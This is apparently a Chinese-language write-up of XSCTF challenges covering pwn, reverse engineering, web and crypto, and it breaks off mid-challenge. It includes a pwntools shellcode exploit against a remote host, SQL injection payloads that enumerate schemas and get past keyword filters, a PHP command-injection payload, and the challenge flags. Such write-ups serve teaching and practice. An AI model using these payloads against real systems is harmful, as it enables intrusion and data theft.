0.text:000055A4CE798222 call init.text:000055A4CE798227 mov [rbp+var_8], 1.text:000055A4CE79822E lea rax, s ; &quot;Welcome to XSCTF&quot;.text:000055A4CE798235 mov rdi, rax ; s.text:000055A4CE798238 call _puts.text:000055A4CE79823D lea rax, [rbp+buf].text:000055A4CE798241 mov edx, 81 ; nbytes.text:000055A4CE798246 mov rsi, rax ; buf.text:000055A4CE798249 mov edi, 0 ; fd.text:000055A4CE79824E call _read.text:000055A4CE798253 lea rax, aInputYourMagic ; &quot;input your magic code:&quot;.text:000055A4CE79825A mov rdi, rax ; s.text:000055A4CE79825D call _puts.text:000055A4CE798262 lea rax, [rbp+s].text:000055A4CE798269 mov edx, 256 ; nbytes.text:000055A4CE79826E mov rsi, rax ; buf.text:000055A4CE798271 mov edi, 0 ; fd.text:000055A4CE798276 call _read.text:000055A4CE79827B mov [rbp+var_4], eax.text:000055A4CE79827E cmp [rbp+var_4], 0.text:000055A4CE798282 jg short loc_55A4CE79828B.text:000055A4CE798284 mov eax, 0.text:000055A4CE798289 jmp short locret_55A4CE7982DE.text:000055A4CE79828B ; ---------------------------------------------------------------------------.text:000055A4CE79828B.text:000055A4CE79828B loc_55A4CE79828B: ; CODE XREF: main+74↑j.text:000055A4CE79828B lea rax, [rbp+s].text:000055A4CE798292 mov rdi, rax ; s.text:000055A4CE798295 call _strlen.text:000055A4CE79829A mov edx, [rbp+var_8].text:000055A4CE79829D movsxd rdx, edx.text:000055A4CE7982A0 cmp rax, rdx.text:000055A4CE7982A3 ja short loc_55A4CE7982BA.text:000055A4CE7982A5 lea rax, [rbp+s].text:000055A4CE7982AC mov rdi, rax ; s.text:000055A4CE7982AF call _strlen.text:000055A4CE7982B4 cmp rax, 24.text:000055A4CE7982B8 jbe short loc_55A4CE7982D0.text:000055A4CE7982BA.text:000055A4CE7982BA loc_55A4CE7982BA: ; CODE XREF: main+95↑j.text:000055A4CE7982BA lea rax, aTooLong ; &quot;too long!&quot;.text:000055A4CE7982C1 mov rdi, rax ; s.text:000055A4CE7982C4 call _puts.text:000055A4CE7982C9 mov eax, 0.text:000055A4CE7982CE jmp short locret_55A4CE7982DE.text:000055A4CE7982D0 ; ---------------------------------------------------------------------------.text:000055A4CE7982D0.text:000055A4CE7982D0 loc_55A4CE7982D0: ; CODE XREF: main+AA↑j.text:000055A4CE7982D0 lea rax, [rbp+s].text:000055A4CE7982D7 call rax.text:000055A4CE7982D9 mov eax, 0.text:000055A4CE7982DE.text:000055A4CE7982DE locret_55A4CE7982DE: ; CODE XREF: main+7B↑j.text:000055A4CE7982DE ; main+C0↑j.text:000055A4CE7982DE leave.text:000055A4CE7982DF retn.text:000055A4CE7982DF ; &#125; &#x2F;&#x2F; starts at 55A4CE79820E.text:000055A4CE7982DF main endp 值得注意的点是程序接收了两次用户输入而在接收了两次输入之后程序会对输入进行两次检查 在调用read函数之后，程序使用strlen函数将输入的长度存储在rax中，接着程序会将rax与栈上的一个值进行比较，如果rax大于该值就不会执行shellcode 第二次是与一个固定值（24）比较，如果大于这个值就不会执行shellcode 其中第一次栈上的值其实可以通过第一次的输入修改，这样就可以绕过这次比较而第二次的比较需要在写入的payload中使用%00作为分隔符，分开正常输入和shellcode exp 1234567891011121314from pwn import *#p = process(&#x27;./toolong&#x27;)p = remote(&quot;43.248.97.213&quot;, 30510)p.recv()p.sendline(b&#x27;z&#x27;*80)p.recv()context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)shellcode = asm(shellcraft.sh()) + b&#x27;\\x00&#x27;p.sendline(p64(0x1234)+shellcode)p.interactive() XSCTF&#123;qy_7t11_y0u_th4t_y0ur_p4yl0ad_15_to0_lon9&#125; Lets_go_to_xor只是一个超级Eazzzzzzzzzzy的Go程序,Let&#39;s Go! 使用golang编写编译的可执行文件其主函数在main.main中 进入main.main找到main.decode 1234567891011121314151617181920212223242526__int64 __usercall main_decode@&lt;rax&gt;()&#123; __int64 v0; // rax unsigned __int64 v1; // rbx unsigned __int64 i; // [rsp+12h] [rbp-30h] if ( v1 != qword_C86F18 ) return 0LL; for ( i = 0LL; (__int64)v1 &gt; (__int64)i; ++i ) &#123; if ( i &gt;= v1 ) runtime_panicIndex(); if ( (unsigned __int64)((__int64)i % 10) &gt;= 0xA ) runtime_panicIndex(); if ( i &gt;= v1 ) runtime_panicIndex(); *(_BYTE *)(v0 + i) = aIL0veCtf[(__int64)i % 10] ^ *(_BYTE *)(i + v0); if ( i &gt;= v1 ) runtime_panicIndex(); if ( qword_C86F18 &lt;= i ) runtime_panicIndex(); if ( *((_BYTE *)main_enc + i) != *(_BYTE *)(i + v0) ) return 0LL; &#125; return 1LL;&#125; 虽然和C语言不太一样，但是还是可以勉强看出来逻辑，大概就是下面这个意思 12345for ( i = 0LL; (__int64)v1 &gt; (__int64)i; ++i ) *(_BYTE *)(v0 + i) = aIL0veCtf[(__int64)i % 10] ^ *(_BYTE *)(i + v0); if ( *((_BYTE *)main_enc + i) != *(_BYTE *)(i + v0) ) return 0LL; &#125; 找到main_enc和aIL0veCtf，提取数据，将main_enc与aIL0veCtf循环异或就可以得到flag exp 12345key = &#x27;i_l0ve_CtF&#x27;s = [0x0F, 0x33, 0x0D, 0x57, 0x0D, 0x3D, 0x0C, 0x14, 0x38, 0x0E, 0x21, 0x17, 0x33, 0x01, 0x05, 0x3A, 0x0F, 0x34, 0x1A, 0x19, 0x24, 0x6B, 0x1F, 0x64, 0x13, 0x17, 0x22]for i in range(len(s)): print(chr((s[i]^ord(key[i%10]))&amp;0xff), end=&#x27;&#x27;) flag&#123;XSWLHHH_1s_Pwn_M4sTer&#125; loglistening题目下发一个安装包jadx打开看到如下代码 12345678910111213141516171819202122232425262728293031323334package com.example.loglistening;import android.os.Bundle;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.Toast;import androidx.appcompat.app.AppCompatActivity;import com.example.loglistening.databinding.ActivityMainBinding;public class MainActivity extends AppCompatActivity &#123; private ActivityMainBinding binding; public native void fasheng(); static &#123; System.loadLibrary(&quot;loglistening&quot;); &#125; /* access modifiers changed from: protected */ public void onCreate(Bundle bundle) &#123; super.onCreate(bundle); ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater()); this.binding = inflate; setContentView((View) inflate.getRoot()); ((Button) findViewById(C0587R.C0590id.button1)).setOnClickListener(new OnClickListener() &#123; public void onClick(View view) &#123; System.out.println(&quot;好像有什么事情在native层发生了!&quot;); MainActivity.this.fasheng(); Toast.makeText(MainActivity.this.getApplicationContext(), &quot;flag已经生成了！&quot;, 0).show(); &#125; &#125;); &#125;&#125; 是通过native层的代码生成的flag找到so文件扔进ida，找到flag的生成代码 12345678910unsigned __int64 Java_com_example_loglistening_MainActivity_fasheng()&#123; char v1[40]; // [rsp+0h] [rbp-38h] BYREF unsigned __int64 v2; // [rsp+28h] [rbp-10h] v2 = __readfsqword(0x28u); md5(&quot;stardustduststar&quot;, v1); __android_log_print(4LL, &quot;xilo&quot;, &quot;flag&#123;%s&#125;&quot;, v1); return __readfsqword(0x28u);&#125; 按道理说把字符串md5之后就可以得到flag了，但是失败了 看到log字样，直接查日志 模拟器开启开发者选项 adb devices确认连接成功 输入adb logcat -v time&gt;D:log.txt开始抓取日志，期间打开软件点击按钮生成flag 然后返回命令行Ctrl+C完成抓取 找到log.txt查看日志（虽然命令写的在D盘，但是实际上是在当前目录） flag&#123;4724110e8c8a83c123d6df82efee8c53&#125; picchange输入数字即可得到flag哦 一开始想的是直接扔进ida反编译然后看对图像的加密逻辑，也就是下面的代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647void __fastcall sub_7FF6B8023C20(const char *a1, __int64 a2)&#123; FILE *Stream; // [rsp+28h] [rbp+8h] FILE *Streama; // [rsp+28h] [rbp+8h] int v4; // [rsp+44h] [rbp+24h] void *Buffer; // [rsp+68h] [rbp+48h] int i; // [rsp+84h] [rbp+64h] sub_7FF6B80213C0(&amp;unk_7FF6B8036017); Stream = fopen(a1, &quot;rb&quot;); if ( Stream ) &#123; fseek(Stream, 0, 2); v4 = ftell(Stream); fseek(Stream, 0, 0); Buffer = malloc(v4); if ( Buffer ) &#123; fread(Buffer, 1ui64, v4, Stream); fclose(Stream); for ( i = 0; i &lt; v4; ++i ) *((_BYTE *)Buffer + i) ^= strtol((const char *)(i % 32 + a2), 0i64, 16); Streama = fopen(&quot;picc_xor.png&quot;, &quot;wb&quot;); if ( Streama ) &#123; fwrite(Buffer, 1ui64, v4, Streama); fclose(Streama); free(Buffer); sub_7FF6B80211CC(&amp;unk_7FF6B802CFB8); &#125; else &#123; perror(&amp;byte_7FF6B802CFA8); free(Buffer); &#125; &#125; else &#123; perror(&amp;byte_7FF6B802CF80); fclose(Stream); &#125; &#125; else &#123; perror(&amp;ErrMsg); &#125;&#125; 可以看到是对图像文件的每一个字节都进行了异或运算，但是异或的对象是不确定的在交叉引用到最原始的变量以及动态调试之后得出结论：使用的是输入的三位数字的md5值作为key，对图像文件进行循环异或的 1234567891011121314151617181920212223242526272829303132Stack[00001C64]:0000003589DCF5A8 db 32h ; 2Stack[00001C64]:0000003589DCF5A9 db 30h ; 0Stack[00001C64]:0000003589DCF5AA db 32h ; 2Stack[00001C64]:0000003589DCF5AB db 63h ; cStack[00001C64]:0000003589DCF5AC db 62h ; bStack[00001C64]:0000003589DCF5AD db 39h ; 9Stack[00001C64]:0000003589DCF5AE db 36h ; 6Stack[00001C64]:0000003589DCF5AF db 32h ; 2Stack[00001C64]:0000003589DCF5B0 db 61h ; aStack[00001C64]:0000003589DCF5B1 db 63h ; cStack[00001C64]:0000003589DCF5B2 db 35h ; 5Stack[00001C64]:0000003589DCF5B3 db 39h ; 9Stack[00001C64]:0000003589DCF5B4 db 30h ; 0Stack[00001C64]:0000003589DCF5B5 db 37h ; 7Stack[00001C64]:0000003589DCF5B6 db 35h ; 5Stack[00001C64]:0000003589DCF5B7 db 62h ; bStack[00001C64]:0000003589DCF5B8 db 39h ; 9Stack[00001C64]:0000003589DCF5B9 db 36h ; 6Stack[00001C64]:0000003589DCF5BA db 34h ; 4Stack[00001C64]:0000003589DCF5BB db 62h ; bStack[00001C64]:0000003589DCF5BC db 30h ; 0Stack[00001C64]:0000003589DCF5BD db 37h ; 7Stack[00001C64]:0000003589DCF5BE db 31h ; 1Stack[00001C64]:0000003589DCF5BF db 35h ; 5Stack[00001C64]:0000003589DCF5C0 db 32h ; 2Stack[00001C64]:0000003589DCF5C1 db 64h ; dStack[00001C64]:0000003589DCF5C2 db 32h ; 2Stack[00001C64]:0000003589DCF5C3 db 33h ; 3Stack[00001C64]:0000003589DCF5C4 db 34h ; 4Stack[00001C64]:0000003589DCF5C5 db 62h ; bStack[00001C64]:0000003589DCF5C6 db 37h ; 7Stack[00001C64]:0000003589DCF5C7 db 30h ; 0 这段数据就是输入的测试数据123对应的md5值，而为了解密图像，输入的key需要满足一定条件 12请输入你的key： 123MD5 的前三位数字与 key的本身值 不相等。注:数字范围为0--9 这里需要注意的主要是数字范围为0--9指的是输入的key还是md5的值，还是两者皆是答案是只有输入的key，因为作为循环异或的对象长度应该是一定的，而如果转换为十进制的话原本的md5编码的长度可能会变化，这一点也可以在先前对图像加密的代码中得出 1*((_BYTE *)Buffer + i) ^= strtol((const char *)(i % 32 + a2), 0i64, 16); 可以看到也是以32为周期的 所以现在的问题就是找到某三位数字，其md5的值的前三位与原本的值是相等的 生成正确的key 1234567891011import hashlibm = hashlib.md5()for i in range(0,10): for j in range(0, 10): for k in range(0, 10): num = f&quot;&#123;i*100+j*10+k:03d&#125;&quot; c = hashlib.md5(num.encode(&#x27;utf8&#x27;)).hexdigest() print(num, str(c)[0:3]) if str(num) == str(c)[0:3]: print(num) 这里有个坑，使用python实现md5编码还有一种先update再hexdigest的方法，那种方法在这里是行不通的320然后将key作为输入就可以得到解密后的图片了 flag&#123;pic_pic_is_so_easy!&#125; Ro1ling~题目描述 flag is rolling ~ flag is flying ~ press q to quit tips: The flag format is XSCTF\\&#123;[ -~]+\\&#125; 运行程序，会出现弹幕一样飘过的文字但是，在中止运行时出现了这样的报错 123456Traceback (most recent call last): File &quot;Ro1ling.py&quot;, line 97, in &lt;module&gt; File &quot;curses\\__init__.py&quot;, line 94, in wrapper File &quot;Ro1ling.py&quot;, line 94, in mainKeyboardInterrupt[21964] Failed to execute script &#x27;Ro1ling&#x27; due to unhandled exception! 熟悉的Traceback，一眼就能看出来是python 所以这是一个使用python编写并打包的exe文件能打包python的工具主要有pyinstaller等，这里使用对应的pyinstxtractor反编译 1python pyinstxtractor.py Ro1ling.exe 运行以上命令之后就会在当前目录下生成一个文件夹，其中有同名的pyc文件使用uncompyle6将pyc文件转换为py文件但是报错了使用在线网站的结果也是不完整的 上网查询之后找到这么一篇博客python逆向实战：反编译python3 pyc文件 - 乘舟凉 - 博客园 (cnblogs.com) 里边有手动提取opcode的示例代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import codefrom uncompyle6.main import decompileimport sys# version = (3, 8, 0)import disdef get_sub_codeObject_list(co): return [ins for ins in list(dis.Bytecode(co)) if &quot;code object&quot; in str(ins.argval)]outstream = sys.stdoutshowasm = Noneshowast = Falseshowgrammar = Falsesource_encoding = Nonemapstream = Nonedo_fragments = Falsefrom xdis import load_modulefilename = &quot;Ro1ling.pyc&quot;code_objects = &#123;&#125;(version, timestamp, magic_int, co, is_pypy, source_size, sip_hash) = load_module( filename, code_objects)def decompile_part(co,father_name=None,outstream=sys.stdout): try: if father_name is not None: name = &quot;%s.%s&quot; % (father_name,co.co_name) else: name = co.co_name outstream.write(&quot;\\n# %s ____________________________________________\\n&quot; % name) decompile( version, co, outstream, None, False, timestamp, False, None, code_objects=&#123;&#125;, source_size=source_size, is_pypy=False, magic_int=magic_int, mapstream=None, do_fragments=False, ) except: bytecode = get_sub_codeObject_list(co) for code in bytecode: co = code.argval decompile_part(co,name,outstream)decompile_part(co) 1234567891011121314import disimport marshalimport sysimport iosys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#x27;utf8&#x27;) #改变标准输出的默认编码if len(sys.argv) == 2: filename = sys.argv[1] with open(filename,&quot;rb&quot;) as fp: byteCode = fp.read()[16:] co = marshal.loads(byteCode) dis.dis(co) 先运行第一份代码，再运行第二份代码，就可以得到opcode的输出 1234567891011121314 28 72 BUILD_LIST 0 74 LOAD_CONST 6 ((&#x27;Summer in the hills&#x27;, &#x27;Those hazy days I do remember&#x27;, &#x27;We were running still&#x27;, &#x27;Had the whole world at our feet&#x27;, &#x27;Watching seasons change&#x27;, &#x27;Our roads were lined with adventure&#x27;, &#x27;Mountains in the way&#x27;, &quot;Couldn&#x27;t keep us from the sea&quot;, &#x27;Here we stand open arms&#x27;, &#x27;This is home where we are&#x27;, &#x27;Ever strong in the world that we made&#x27;, &#x27;I still hear you in the breeze&#x27;, &#x27;See your shadows in the trees&#x27;, &#x27;Holding on, memories never change&#x27;)) 76 CALL_FINALLY 1 (to 79) 78 STORE_DEREF 2 (phrases) 29 80 LOAD_CONST 7 (&#x27;𝙓𝙎𝘾𝙏𝙁&#123;𝙁0𝙧_0𝙣𝙘3_𝙮0𝙪_𝙝4𝙫3_7𝙖57𝙚𝙙_𝙛𝙡𝙞𝙜 𝙝𝙩_𝙮0𝙪_𝙬1𝙡𝙡_�44𝙡𝙠_7𝙝3_3𝙖𝙧7𝙝_𝙬17𝙝_𝙮0𝙪𝙧_3𝙮35_7𝙪𝙧𝙣3𝙙_5𝙠𝙮𝙬4𝙧𝙙5&#125;&#x27;) 82 STORE_DEREF 3 (secret_message) 46 84 LOAD_DEREF 4 (stdscr) &gt;&gt; 86 LOAD_METHOD 7 (nodelay) 88 LOAD_CONST 8 (True) 90 CALL_METHOD 1 92 POP_TOP 其中因为命令行的编码原因这里的flag其实是乱码（因此我还分析了一下opcode有没有加密的过程，事实证明没有）但是opcode转换为py代码的方式没有找到 在复制到其他文本编辑器之后就可以看到flag了（要手打，因为格式写了只支持ascii编码的字符，这里是unicode） XSCTF&#123;F0r_0nc3_y0u_h4v3_7a57ed_flight_y0u_w1ll_w4lk_7h3_3ar7h_w17h_y0ur_3y35_7urn3d_5kyw4rd5&#125;这flag真长啊 Running~一个没有后缀的文件，内容是js代码 1var _0x21b6c9=_0xe50d;function _0xe50d(_0x483c4e,_0x3bb3e1)&#123;var _0x1173b4=_0x1173();return _0xe50d=function(_0xe50d90,_0x1a4c11)&#123;_0xe50d90=_0xe50d90-0x105;var _0x33ff31=_0x1173b4[_0xe50d90];return _0x33ff31;&#125;,_0xe50d(_0x483c4e,_0x3bb3e1);&#125;function _0x1173()&#123;var _0x2badaa=[&#x27;920aGutvi&#x27;,&#x27;517wlRFdu&#x27;,&#x27;221112hjXCvb&#x27;,&#x27;169436bqkkfr&#x27;,&#x27;8dhAXCJ&#x27;,&#x27;12838203EfwKcG&#x27;,&#x27;log&#x27;,&#x27;CgogX18gICBfXyAgIF9fX19fICAgIF9fX19fICAgX19fX19fXyAgIF9fX19fXyAgICAgX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX19fXyAgICAgICAgICAgXyAgIF8gICAgIF8gICAgICAgICAgIF8gICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICBfXyAgICAgICAgICAgICAgICAgIF8gIF8gICAgIF8gICAgIF8gICAgX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX18gICAgICAgICAgICAgX19fXyAgICBfICAgICAgICBfXyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXyAgICAgXyAgICAgICAgICAgICAgICAgIF9fICAgCiBcIFwgLyAvICAvIF9fX198ICAvIF9fX198IHxfXyAgIF9ffCB8ICBfX19ffCAgIC8gLyAgICAgL1wgICAgICAgICAgICAgICAgICAgICAgfF8gICBffCAgICAgICAgIChfKSB8IHwgICAoXykgICAgICAgICB8IHwgICAgICAgICAgfCAgX19fX3wgICAgICAgICAgICAgICAgL18gfCAgICAgICAgICAgICAgICB8IHx8IHwgICB8IHwgICAoXykgIC8gXyBcICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8gX3wgICAgICAgICAgIC8gX18gXCAgfCB8ICAgICAgLyBffCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgfCAgIChfKSAgICAgICAgICAgICAgICAgXCBcICAKICBcIFYgLyAgfCAoX19fICAgfCB8ICAgICAgICAgfCB8ICAgIHwgfF9fICAgICB8IHwgICAgIC8gIFwgICAgIF8gX18gICAgICAgICAgICAgIHwgfCAgICBfIF9fICAgIF8gIHwgfF8gICBfICAgIF9fIF8gIHwgfCAgICAgICAgICB8IHxfXyAgICBfXyAgX18gIF8gX18gICAgfCB8ICAgX19fICAgIF8gX18gIHwgfHwgfF8gIHwgfF8gICBfICB8IHwgfCB8ICBfIF9fICAgICAgICAgICAgICBfX18gICB8IHxfICAgICAgICAgICB8IHwgIHwgfCB8IHxfXyAgIHwgfF8gICBfICAgXyAgIF9fXyAgICBfX18gICAgX18gXyAgfCB8XyAgIF8gICAgX19fICAgIF8gX18gICAgfCB8IAogICA+IDwgICAgXF9fXyBcICB8IHwgICAgICAgICB8IHwgICAgfCAgX198ICAgLyAvICAgICAvIC9cIFwgICB8ICdfIFwgICAgICAgICAgICAgfCB8ICAgfCAnXyBcICB8IHwgfCBfX3wgfCB8ICAvIF9gIHwgfCB8ICAgICAgICAgIHwgIF9ffCAgIFwgXC8gLyB8ICdfIFwgICB8IHwgIC8gXyBcICB8ICdfX3wgfF9fICAgX3wgfCBfX3wgfCB8IHwgfCB8IHwgfCAnXyBcICAgICAgICAgICAgLyBfIFwgIHwgIF98ICAgICAgICAgIHwgfCAgfCB8IHwgJ18gXCAgfCAgX3wgfCB8IHwgfCAvIF9ffCAgLyBfX3wgIC8gX2AgfCB8IF9ffCB8IHwgIC8gXyBcICB8ICdfIFwgICAgXCBcCiAgLyAuIFwgICBfX19fKSB8IHwgfF9fX18gICAgIHwgfCAgICB8IHwgICAgICBcIFwgICAgLyBfX19fIFwgIHwgfCB8IHwgICAgICAgICAgIF98IHxfICB8IHwgfCB8IHwgfCB8IHxfICB8IHwgfCAoX3wgfCB8IHwgICAgICAgICAgfCB8X19fXyAgID4gIDwgIHwgfF8pIHwgIHwgfCB8IChfKSB8IHwgfCAgICAgICB8IHwgICB8IHxfICB8IHwgfCB8X3wgfCB8IHwgfCB8ICAgICAgICAgIHwgKF8pIHwgfCB8ICAgICAgICAgICAgfCB8X198IHwgfCB8XykgfCB8IHwgICB8IHxffCB8IFxfXyBcIHwgKF9fICB8IChffCB8IHwgfF8gIHwgfCB8IChfKSB8IHwgfCB8IHwgICAvIC8KIC9fLyBcX1wgfF9fX19fLyAgIFxfX19fX3wgICAgfF98ICAgIHxffCAgICAgICB8IHwgIC9fLyAgICBcX1wgfF98IHxffCAgICAgICAgICB8X19fX198IHxffCB8X3wgfF98ICBcX198IHxffCAgXF9fLF98IHxffCAgICAgICAgICB8X19fX19ffCAvXy9cX1wgfCAuX18vICAgfF98ICBcX19fLyAgfF98ICAgICAgIHxffCAgICBcX198IHxffCAgXF9fXy8gIHxffCB8X3wgICAgICAgICAgIFxfX18vICB8X3wgICAgICAgICAgICAgXF9fX18vICB8Xy5fXy8gIHxffCAgICBcX18sX3wgfF9fXy8gIFxfX198ICBcX18sX3wgIFxfX3wgfF98ICBcX19fLyAgfF98IHxffCAgfCB8IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcX1wgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICB8IHwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19fX19fICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9fLyAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgIHxffCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHxfX19fX198ICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKCg==&#x27;,&#x27;3076824IERKkW&#x27;,&#x27;6626otVnDv&#x27;,&#x27;4488330eyQBas&#x27;,&#x27;7196435AHLNnm&#x27;];_0x1173=function()&#123;return _0x2badaa;&#125;;return _0x1173();&#125;(function(_0x3fa77a,_0x506be4)&#123;var _0x324ad3=_0xe50d,_0x1b9807=_0x3fa77a();while(!![])&#123;try&#123;var _0x5cf5b7=-parseInt(_0x324ad3(0x107))/0x1*(-parseInt(_0x324ad3(0x10f))/0x2)+-parseInt(_0x324ad3(0x10e))/0x3+parseInt(_0x324ad3(0x109))/0x4+parseInt(_0x324ad3(0x105))/0x5+-parseInt(_0x324ad3(0x110))/0x6+parseInt(_0x324ad3(0x10b))/0x7*(parseInt(_0x324ad3(0x10a))/0x8)+-parseInt(_0x324ad3(0x108))/0x9*(parseInt(_0x324ad3(0x106))/0xa);if(_0x5cf5b7===_0x506be4)break;else _0x1b9807[&#x27;push&#x27;](_0x1b9807[&#x27;shift&#x27;]());&#125;catch(_0x29c073)&#123;_0x1b9807[&#x27;push&#x27;](_0x1b9807[&#x27;shift&#x27;]());&#125;&#125;&#125;(_0x1173,0xf2d11),console[_0x21b6c9(0x10c)](atob(_0x21b6c9(0x10d)))); 直接复制到浏览器控制台 123456789__ __ _____ _____ _______ ______ __ _____ _ _ _ _ ______ __ _ _ _ _ ___ __ ____ _ __ _ _ __ \\ \\ &#x2F; &#x2F; &#x2F; ____| &#x2F; ____| |__ __| | ____| &#x2F; &#x2F; &#x2F;\\ |_ _| (_) | | (_) | | | ____| &#x2F;_ | | || | | | (_) &#x2F; _ \\ &#x2F; _| &#x2F; __ \\ | | &#x2F; _| | | (_) \\ \\ \\ V &#x2F; | (___ | | | | | |__ | | &#x2F; \\ _ __ | | _ __ _ | |_ _ __ _ | | | |__ __ __ _ __ | | ___ _ __ | || |_ | |_ _ | | | | _ __ ___ | |_ | | | | | |__ | |_ _ _ ___ ___ __ _ | |_ _ ___ _ __ | | &gt; &lt; \\___ \\ | | | | | __| &#x2F; &#x2F; &#x2F; &#x2F;\\ \\ | &#39;_ \\ | | | &#39;_ \\ | | | __| | | &#x2F; _&#96; | | | | __| \\ \\&#x2F; &#x2F; | &#39;_ \\ | | &#x2F; _ \\ | &#39;__| |__ _| | __| | | | | | | | &#39;_ \\ &#x2F; _ \\ | _| | | | | | &#39;_ \\ | _| | | | | &#x2F; __| &#x2F; __| &#x2F; _&#96; | | __| | | &#x2F; _ \\ | &#39;_ \\ \\ \\ &#x2F; . \\ ____) | | |____ | | | | \\ \\ &#x2F; ____ \\ | | | | _| |_ | | | | | | | |_ | | | (_| | | | | |____ &gt; &lt; | |_) | | | | (_) | | | | | | |_ | | | |_| | | | | | | (_) | | | | |__| | | |_) | | | | |_| | \\__ \\ | (__ | (_| | | |_ | | | (_) | | | | | &#x2F; &#x2F;&#x2F;_&#x2F; \\_\\ |_____&#x2F; \\_____| |_| |_| | | &#x2F;_&#x2F; \\_\\ |_| |_| |_____| |_| |_| |_| \\__| |_| \\__,_| |_| |______| &#x2F;_&#x2F;\\_\\ | .__&#x2F; |_| \\___&#x2F; |_| |_| \\__| |_| \\___&#x2F; |_| |_| \\___&#x2F; |_| \\____&#x2F; |_.__&#x2F; |_| \\__,_| |___&#x2F; \\___| \\__,_| \\__| |_| \\___&#x2F; |_| |_| | | \\_\\ ______ ______ | | ______ ______ &#x2F;_&#x2F; |______| |______| |_| |______| |______| 拉伸一下就可以看到flag（换成不会自动换行的文本编辑软件，如notepad++） XSCTF&#123;An_Initial_Exp1or4ti0n_of_Obfuscation&#125; saveSaofe1a_partA考sql注入测试一下发现是字符型查询，并且存在联合注入 首先查询当前数据库 然后查询该数据库下的表 然后查询表下的字段 根据题目提示，逐个翻表 123456-1&#x27; union select database(),2,3,4#-1&#x27; union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema=&#x27;student&#x27;#-1&#x27; union select group_concat(column_name),2,3,4 from information_schema.columns where table_name=&#x27;class1&#x27;#-1&#x27; union select group_concat(id),group_concat(name),group_concat(class),group_concat(hobbies) from class1#-1&#x27; union select group_concat(id),group_concat(name),group_concat(class),group_concat(hobbies) from class2#-1&#x27; union select group_concat(id),group_concat(name),group_concat(class),group_concat(hobbies) from class3# XSCTF&#123;Saofe1a_r3a11y_l0ve_xiaomei&#125; saveSaofe1a_partB同样是sql注入经过测试：让我想想除了insert、where、delete、select、drop、update和.你们大黑阔还有什么招嘻嘻，想起来了，set、prepare、execute也不行哦 用handler可以查 1-1&#x27;;handler `2333` open;handler `2333` read first;handler `2333` close;# 如果不在第一条，但是题目又过滤了where关键字，可以使用limit 1-1&#x27;;handler `class3` open;handler `class3` read first limit 30,1;handler `class3` close;# XSCTF&#123;Saofe1a_wAnt_a_9ir1fri3nd&#125; 燕子不要走~12345678910//燕子，燕子，没有你我怎么活啊，不要甩开我啊 function hello_shell($cmd)&#123; system($cmd.&quot;&gt;/dev/null 2&gt;&amp;1&quot;); &#125; isset($_GET[&#x27;cmd&#x27;]) ? hello_shell($_GET[&#x27;cmd&#x27;]) : null; highlight_file(__FILE__); ?&gt; 直接用分号隔开即可?cmd=cat /flag; XSCTF&#123;Yanz1_i_w1sh_y0u_hApp1neSs&#125; gift_RSA123456789101112131415161718from Crypto.Util.number import *from secret import flagm = bytes_to_long(flag)p = getStrongPrime(512)q = getStrongPrime(512)n = p*qe = 0x10001phi = (p-1)*(q-1)d = inverse(e, phi)gift = pow(m, d, n)print(f&#x27;n = &#123;n&#125;&#x27;)print(f&#x27;gift = &#123;gift&#125;&#x27;)&quot;&quot;&quot;n = 130440460982994054886194132893343627339035187428107218807321147405620338019874355591446417761513664225266160038818394605319887375239391287230478660163653875242501357695986002630460984513202850115668909532480905521208688225215737924902179053646260998230998190491472420237789646660909155287180241747552560215117gift = 44036549032562248382682022800700872356499366761892236792447591596664499865604669855744690854360939082917175165565199000408965931210082233109686848459850428016737476624525455409019711542678368419364411036613979498284492060998121701989232698779962405921949163953624713959841997664118682769289019562394455997308&quot;&quot;&quot; 根据公钥加密算法的特性，公私钥互换效果是一样的，这里用私钥加密（签名），就可以使用公钥解密（验证） exp 1234567from Crypto.Util.number import *e = 0x10001c = 44036549032562248382682022800700872356499366761892236792447591596664499865604669855744690854360939082917175165565199000408965931210082233109686848459850428016737476624525455409019711542678368419364411036613979498284492060998121701989232698779962405921949163953624713959841997664118682769289019562394455997308n = 130440460982994054886194132893343627339035187428107218807321147405620338019874355591446417761513664225266160038818394605319887375239391287230478660163653875242501357695986002630460984513202850115668909532480905521208688225215737924902179053646260998230998190491472420237789646660909155287180241747552560215117print(long_to_bytes(pow(c, e, n))) XSCTF&#123;H3re_i5_@_Gif7_f0r_y0u_From_Euler:)))))!&#125; 你说你是凯撒大帝尊嘟假嘟啊1Öv0 0vo O.0 O_Ö Övo 0vo ov0 ovÖ o.Ö owÖ 0.o OwÖ o.O Ö.O O_0 o_Ö Ö_0 OwÖ Ov0 0wÖ Ö.Ö owO 0v0 